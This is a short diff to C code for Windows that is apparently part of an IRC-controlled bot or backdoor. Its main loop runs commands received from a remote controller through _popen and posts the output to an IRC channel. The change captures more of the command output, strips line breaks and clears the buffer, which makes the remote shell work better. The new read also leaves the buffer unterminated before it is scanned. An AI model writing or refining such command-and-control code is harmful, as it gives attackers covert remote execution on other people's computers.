@@ -108,10 +108,22 @@ void et_main_loop_win(SOCKET socket, char *nick)
 						char cmd_message[1024];
 
 						FILE *output_file = _popen(cmd, "rt");
-						fgets(cmd_output, 512, output_file);
+						fread((void *) cmd_output, 1, 512, output_file);
+
+						int i;
+						for (i = 0; cmd_output[i]; i++)
+						{
+							if (cmd_output[i] == '\r' || cmd_output[i] == '\n')
+							{
+								cmd_output[i] = ' ';
+							}
+						}
+
 						sprintf(cmd_message, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
 						send(socket, cmd_message, strlen(cmd_message), 0);
 						_pclose(output_file);
+
+						ZeroMemory(cmd_output, 512);
 					}
 				}
 			}
